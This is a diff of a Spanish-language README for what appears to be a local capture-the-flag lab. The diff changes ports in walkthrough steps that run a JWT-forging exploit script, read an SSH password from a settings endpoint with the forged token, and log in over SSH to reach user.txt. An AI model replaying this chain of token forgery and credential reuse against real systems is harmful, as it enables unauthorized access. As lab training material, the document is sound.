@@ -8,7 +8,7 @@ sh start.sh
 ```
 
 ## Acceso
-- Web: http://localhost:8080
+- Web: http://localhost:8182
 - SSH: localhost:2222
 
 ---
@@ -69,20 +69,20 @@ print(f"[+] Token: {forged}")
 
 ```bash
 pip install jwcrypto requests
-python3 exploit_jwt.py http://localhost:8080
+python3 exploit_jwt.py http://localhost:8182
 ```
 
 **Obtener credenciales SSH:**  
 Usa el token en el navegador (sessionStorage → `auth_token`) o con curl:
 ```bash
-curl -H "Authorization: Bearer <TOKEN>" http://localhost:8080/api/settings | python3 -m json.tool
+curl -H "Authorization: Bearer <TOKEN>" http://localhost:8182/api/settings | python3 -m json.tool
 # → encryptionKey: D3pl0y_$$H_Now42!
 ```
 
 **Password spray en SSH:**
 ```bash
 # La contraseña funciona para svc-deploy
-ssh svc-deploy@localhost   # D3pl0y_$$H_Now42!
+ssh svc-deploy@localhost -p 2222   # D3pl0y_$$H_Now42!
 cat ~/user.txt
 ```
 
